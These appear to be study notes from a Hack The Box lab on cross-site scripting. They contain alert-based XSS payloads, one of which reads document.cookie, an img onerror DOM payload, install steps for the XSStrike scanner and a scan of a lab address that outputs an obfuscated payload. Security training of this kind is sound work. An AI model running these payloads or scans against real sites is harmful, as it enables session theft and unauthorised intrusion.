# XSS Basics

## XSS Stored & Reflected

```
<script>alert(document.cookie)</script>
```

## XSS DOM

```
<img src="" onerror=alert(window.origin)>
```

## XSS Discovery

### Install

```
eldeim@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
eldeim@htb[/htb]$ cd XSStrike
eldeim@htb[/htb]$ pip install -r requirements.txt
eldeim@htb[/htb]$ python xsstrike.py

XSStrike v3.1.4
...SNIP...
```

### Use

```
eldeim@htb[/htb]$ python xsstrike.py -u "http://83.136.251.68:34219/?fullname=test&username=test&password=test&email=test%40test.com"

    XSStrike v3.1.5

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: fullname 
[-] No reflection found 
[!] Testing parameter: username 
[-] No reflection found 
[!] Testing parameter: password 
[-] No reflection found 
[!] Testing parameter: email 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <Html%0aONmOUSeOVer%0a=%0a[8].find(confirm)> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```
